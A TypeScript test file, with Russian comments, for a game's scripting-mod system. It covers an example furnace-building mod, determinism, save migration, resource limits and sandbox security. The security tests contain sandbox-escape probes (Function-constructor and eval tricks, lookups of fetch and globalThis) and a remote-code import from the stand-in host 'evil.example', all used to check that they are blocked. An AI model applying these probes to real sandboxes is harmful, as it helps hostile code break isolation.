// v1.11 «Моддинг II (скрипты)»: пример-мод «Авто-стройка печей вокруг руды», события тика N → команды в тике N+1,
// безопасность песочницы (нет сети, хранилищ, создания кода из строк; чужой storage не виден), детерминизм со
// скриптовым модом (две партии и сохранение/загрузка посередине), лимиты (2 мс/тик × 3 → отключение, зависание),
// окна модов и консоль, формат сохранения 15. Запуск: npx tsx tests/scripts.test.ts
import fs from 'fs';
import { Game } from '../src/sim/game';
import { serialize, deserialize, stateHash, migrate, SAVE_VERSION } from '../src/sim/save';
import { ScriptHost, ScriptMod, ConsoleLine, scriptMods } from '../src/mods/script';
import { checkScript, workerSource } from '../src/mods/sandbox';
import { nodeSpawn, stepScripts } from '../src/mods/script-node';
import { parsePackage } from '../src/mods/mod';
import { applyMods } from '../src/mods/registry';
import { readDir } from '../tools/modfs';

let fails = 0; const ok = (c: any, m: string) => { console.log((c ? '  ✔ ' : '  ✘ ') + m); if (!c) fails++; };
const host = (mods: ScriptMod[], o: any = {}) => { const lines: ConsoleLine[] = []; const guis: any[] = []; const h = new ScriptHost(nodeSpawn, { onConsole: l => lines.push(l), onGui: (m, t, op) => guis.push({ m, op }), ...o }); h.setMods(mods); return { h, lines, guis }; };
const AF = readDir('mods/auto-furnaces'); const afPkg = parsePackage(AF, 'auto-furnaces');
const AFMOD: ScriptMod = { name: 'auto-furnaces', title: afPkg.info.title, code: new TextDecoder().decode(AF['control.js']) };

/** место под электробур на железной руде (3×3) с местом под печь у выхода */
function oreSpot(g: Game): { x: number; y: number } {
  for (let r = 4; r < 140; r++) for (let y = -r; y <= r; y++) for (let x = -r; x <= r; x++) {
    if (Math.max(Math.abs(x), Math.abs(y)) !== r) continue;
    let all = true; for (let j = 0; j < 3 && all; j++) for (let i = 0; i < 3 && all; i++) if (g.world.res(x + i, y + j) !== 1) all = false;
    if (!all || !g.canPlace('electric-mining-drill', x, y, 0, false).ok) continue;
    if (!g.canPlace('stone-furnace', x + 1, y - 2, 0, false).ok) continue;
    return { x, y };
  }
  throw new Error('нет руды');
}

async function main() {
  console.log('— пример-мод «Авто-стройка печей вокруг руды»');
  {
    ok(!afPkg.errors.some(e => !e.warn) && !!AF['control.js'] && checkScript(AFMOD.code) === null, 'mods/auto-furnaces: info.json и control.js без ошибок');
    const g = new Game(7, true); const { h, lines, guis } = host([AFMOD]); h.attach(g);
    await stepScripts(g, h, 3);
    ok(h.stats()[0].state === 'run', 'Worker мода запущен (state run)');
    ok(guis.some(x => x.op.op === 'gui' && x.op.id === 'main' && x.op.spec.elements.some((e: any) => e.type === 'list') && x.op.spec.elements.some((e: any) => e.type === 'row')), 'on_load открыл окно мода (текст, список, кнопки)');
    const s = oreSpot(g); g.player.x = s.x + 1.5; g.player.y = s.y + 5;
    g.inv.add('electric-mining-drill', 2); g.inv.add('stone-furnace', 3); const f0 = g.inv.count('stone-furnace');
    let tBuilt = -1, tFurn = -1;
    await stepScripts(g, h, 4, t => { if (t === g.tick && tBuilt < 0) { const e = g.build('electric-mining-drill', s.x, s.y, 0, true); ok(!!e, `игрок поставил электробур на железо (${s.x}, ${s.y})`); tBuilt = g.tick; } });
    for (let i = 0; i < 6 && tFurn < 0; i++) { const f = [...g.ents.values()].find(e => e.proto === 'stone-furnace'); if (f) { tFurn = g.tick; break; } await stepScripts(g, h, 1); }
    const f = [...g.ents.values()].find(e => e.proto === 'stone-furnace');
    const d = [...g.ents.values()].find(e => e.proto === 'electric-mining-drill')!;
    const o = g.drillOut(d);
    ok(!!f && o.x >= f.x && o.x < f.x + f.w && o.y >= f.y && o.y < f.y + f.h, `печь стоит на клетке выхода бура (${o.x}, ${o.y})`);
    ok(g.inv.count('stone-furnace') === f0 - 1, 'печь взята из инвентаря игрока (from_player)');
    await stepScripts(g, h, 3);
    ok(JSON.parse(g.scriptStore['auto-furnaces']).built === 1, 'storage мода: built = 1 (событие on_built печи с by = script:auto-furnaces)');
    ok(g.messages.some(m => /Первая печь/.test(m.text)), 'game.print — сообщение игроку');
    // переключатель в окне: команда modgui → on_gui_click
    g.enqueue({ t: 'modgui', mod: 'auto-furnaces', gui: 'main', el: 'toggle', kind: 'click' }); await stepScripts(g, h, 3);
    ok(JSON.parse(g.scriptStore['auto-furnaces']).on === false, 'кнопка «Выключить» в окне мода → on_gui_click → storage.on = false');
    const s2 = oreSpot(g); g.player.x = s2.x + 1.5; g.player.y = s2.y + 5; const n0 = [...g.ents.values()].filter(e => e.proto === 'stone-furnace').length;
    g.build('electric-mining-drill', s2.x, s2.y, 0, true); await stepScripts(g, h, 4);
    ok([...g.ents.values()].filter(e => e.proto === 'stone-furnace').length === n0, 'выключенный мод печь не ставит');
    // бур на камне — без печи
    ok(!lines.some(l => l.level === 'error'), 'в консоли модов нет ошибок');
    h.stop();
  }

  console.log('— тик N → команды в тике N+1');
  {
    const g = new Game(3, true); let fx = 0, fy = 20; while (!g.canPlace('wooden-chest', fx, fy, 0, false).ok) fx++;
    const code = `game.on_tick(e => { if (e.tick === 20) { game.create_entity({ name: 'wooden-chest', position: { x: ${fx}, y: ${fy} } }); storage.at = e.tick; } });
      game.on_built(e => { storage.seen = e.tick; storage.by = e.by; });`; const { h } = host([{ name: 'n1', title: 'N1', code }]); h.attach(g);
    let built = -1; while (g.tick < 26) { await h.settle(); const had = [...g.ents.values()].some(e => e.proto === 'wooden-chest'); g.step(); if (!had && built < 0 && [...g.ents.values()].some(e => e.proto === 'wooden-chest')) built = g.tick - 1; }
    await stepScripts(g, h, 3);
    const st = JSON.parse(g.scriptStore.n1);
    ok(st.at === 20 && built === 21, `событие тика 20 → сундук построен в тике ${built} (N+1)`);
    ok(st.seen === 21 && st.by === 'script:n1', 'on_built созданного скриптом: тик 21, by = script:n1');
    h.stop();
  }

  console.log('— безопасность песочницы');
  {
    const probe = `
      const r = {};
      const t = (k, f) => { try { const v = f(); r[k] = v === undefined ? 'нет' : typeof v; } catch (e) { r[k] = 'ошибка'; } };
      t('fetch', () => fetch); t('XMLHttpRequest', () => XMLHttpRequest); t('WebSocket', () => WebSocket); t('indexedDB', () => indexedDB);
      t('importScripts', () => importScripts); t('caches', () => caches); t('require', () => require); t('process', () => process);
      t('globalThis', () => globalThis); t('self', () => self); t('setTimeout', () => setTimeout); t('Worker', () => Worker);
      t('Function', () => (function () {}).constructor('return globalThis')()); t('async', () => (async function () {}).constructor('return 1')());
      t('eval', () => (0, eval)('1')); t('this', () => (function () { return this; })()); t('navigator', () => navigator); t('performance', () => performance);
      t('crypto', () => crypto); t('BroadcastChannel', () => BroadcastChannel);
      storage.secret = 'A-' + game.mod;
      game.on_tick(e => { if (e.tick === 1) { storage.report = r; storage.rnd = Math.random(); storage.now = Date.now(); } }, 1);`;
    const spy = `game.on_tick(e => { if (e.tick === 1) storage.seen = JSON.stringify(storage) + '|' + typeof fetch + '|' + Object.keys(game).join(','); });`;
    const g = new Game(11, true); g.scriptStore['spy'] = JSON.stringify({ own: 1 });
    const { h } = host([{ name: 'probe', title: 'P', code: probe }, { name: 'spy', title: 'S', code: spy }]); h.attach(g);
    await stepScripts(g, h, 4);
    const rep = JSON.parse(g.scriptStore.probe).report; const bad = Object.entries(rep).filter(([, v]) => v !== 'нет' && v !== 'ошибка');
    ok(rep && !bad.length, `нет доступа: ${Object.keys(rep).join(', ')}${bad.length ? ' — ДОСТУПНО: ' + bad.map(b => b.join('=')).join(', ') : ''}`);
    const seen = JSON.parse(g.scriptStore.spy).seen as string;
    ok(seen.startsWith('{"own":1}') && !seen.includes('A-probe'), 'мод видит только свой storage (чужой storage и сохранение не передаются)');
    ok(!/storage|save|serialize/.test(seen.split('|')[2].replace('storage', '')) , 'в API нет чтения сохранения');
    ok(checkScript('import("https://evil.example/x.js")') !== null && checkScript('const m = await import ("x")') !== null && checkScript("game.print('import')") === null, 'import() в control.js отклоняется до запуска');
    const g2 = new Game(11, true); const { h: h2, lines } = host([{ name: 'evil', title: 'E', code: 'import("data:text/javascript,1")' }]); h2.attach(g2); await stepScripts(g2, h2, 2);
    ok(h2.stats()[0].state === 'fail' && lines.some(l => /import/.test(l.text)), 'мод с import() не запускается, причина — в консоли');
    h.stop(); h2.stop();
  }

  console.log('— детерминизм со скриптовым модом');
  {
    const code = `game.on_tick(e => { const x = game.random(-20, 20), y = game.random(25, 45); game.create_entity({ name: game.random() < 0.5 ? 'wooden-chest' : 'iron-chest', position: { x, y } }); storage.n = (storage.n || 0) + 1; }, 7);
      game.on_built(e => { if (e.entity.name === 'iron-chest') game.insert(e.entity, 'iron-plate', game.random(1, 9)); storage.last = e.entity.id; });
      game.on_chunk_generated(e => { storage.chunks = (storage.chunks || 0) + 1; });`;
    const M = [{ name: 'det', title: 'D', code }];
    const run = async (saveAt: number | null) => {
      let g = new Game(42, true); let { h } = host(M); h.attach(g);
      for (let t = 0; t < 300; t++) {
        if (saveAt === t) { const data = JSON.parse(JSON.stringify(serialize(g))); h.stop(); g = deserialize(data); ({ h } = host(M)); h.attach(g); }
        await h.settle(); if (t % 50 === 3) g.enqueue({ t: 'input', mx: 1, my: 0, mine: null }); g.step();
      }
      await stepScripts(g, h, 2); const r = { hash: stateHash(g), n: JSON.parse(g.scriptStore.det).n, ents: g.ents.size }; h.stop(); return r;
    };
    const a = await run(null), b = await run(null), c = await run(150);
    ok(a.hash === b.hash && a.n > 30, `две партии с одинаковым сидом — одинаковое состояние (${a.ents} построек, ${a.n} срабатываний)`);
    ok(a.hash === c.hash, 'сохранение и загрузка на тике 150 — то же состояние, что без перерыва (storage и неприменённые события в сохранении)');
  }

  console.log('— лимиты');
  {
    const slow = `game.on_tick(e => { const t = Date.now; let s = 0; for (let i = 0; i < 4e7; i++) s += i; storage.s = s; });`;
    const g = new Game(5, true); const { h, lines } = host([{ name: 'slow', title: 'Медленный', code: slow }]); h.attach(g);
    await stepScripts(g, h, 8);
    ok(h.stats()[0].state === 'off' && /3 раза подряд/.test(h.stats()[0].reason || ''), `мод > 2 мс/тик 3 раза подряд отключён: «${h.stats()[0].reason}»`);
    ok(g.messages.some(m => /Медленный.*отключён/.test(m.text)) && lines.some(l => /отключён/.test(l.text)), 'сообщение игроку и запись в консоли модов');
    const n = g.tick; await stepScripts(g, h, 5); ok(g.tick === n + 5, 'игра идёт дальше без мода');
    h.stop();
    const fat = `const keep = new Array(3e6).fill(0.5); game.on_tick(e => { storage.n = keep.length + e.tick; });`;
    const gm = new Game(5, true); const { h: hm } = host([{ name: 'fat', title: 'Прожорливый', code: fat }], { memMB: 16 }); hm.attach(gm);
    await stepScripts(gm, hm, 12);
    ok(hm.stats()[0].state === 'off' && /МБ памяти/.test(hm.stats()[0].reason || ''), `мод сверх лимита памяти 3 раза подряд отключён: «${hm.stats()[0].reason}»`);
    hm.stop();
    const hang = `game.on_tick(e => { if (e.tick === 2) for (;;) {} });`;
    const g2 = new Game(5, true); const { h: h2 } = host([{ name: 'hang', title: 'Зависший', code: hang }], { hangMs: 400 }); h2.attach(g2);
    const t0 = Date.now(); await stepScripts(g2, h2, 6);
    ok(h2.stats()[0].state === 'fail' && /завис/.test(h2.stats()[0].reason || '') && Date.now() - t0 < 5000, `зависший скрипт остановлен сторожем за ${Date.now() - t0} мс`);
    h2.stop();
    const err = `game.on_tick(e => { if (e.tick === 1) null.x; }); game.on_tick(e => { storage.ok = e.tick; });`;
    const g3 = new Game(5, true); const { h: h3, lines: l3 } = host([{ name: 'err', title: 'E', code: err }]); h3.attach(g3); await stepScripts(g3, h3, 4);
    ok(l3.some(l => l.level === 'error' && /control\.js:1/.test(l.text)) && JSON.parse(g3.scriptStore.err).ok >= 2, 'ошибка в обработчике — в консоли со строкой control.js, мод работает дальше');
    h3.stop();
  }

  console.log('— сохранение, формат 15');
  {
    const g = new Game(9, true); g.scriptStore = { a: '{"x":1}' }; const s = serialize(g);
    ok(s.v === SAVE_VERSION && SAVE_VERSION >= 15 && s.scripts.store.a === '{"x":1}', 'формат 15+: storage модов в сохранении');
    const old = JSON.parse(JSON.stringify(s)); old.v = 14; delete old.scripts; const m = migrate(old);
    ok(m.v === SAVE_VERSION && m.scripts && Object.keys(m.scripts.store).length === 0, 'миграция 14 → текущий: без скриптов');
    ok(deserialize(s).scriptStore.a === '{"x":1}', 'загрузка возвращает storage');
  }

  console.log('— пакет с control.js в реестре модов');
  {
    const r = applyMods([afPkg], [], '1.11.0'); const sm = scriptMods([afPkg]);
    ok(r.loaded.length === 1 && !r.warnings.some(w => /prototypes/.test(w.msg)) && sm.length === 1 && sm[0].name === 'auto-furnaces', 'мод только со скриптом загружается без предупреждения «нет prototypes»');
    applyMods([], [], '1.11.0');
    ok(workerSource('x').includes('__z7.start'), 'исходник Worker: песочница + код мода');
  }
  console.log(fails ? `\nПРОВАЛОВ: ${fails}` : '\nВсе проверки скриптов модов прошли');
  process.exit(fails ? 1 : 0);
}
main().catch(e => { console.error(e); process.exit(1); });
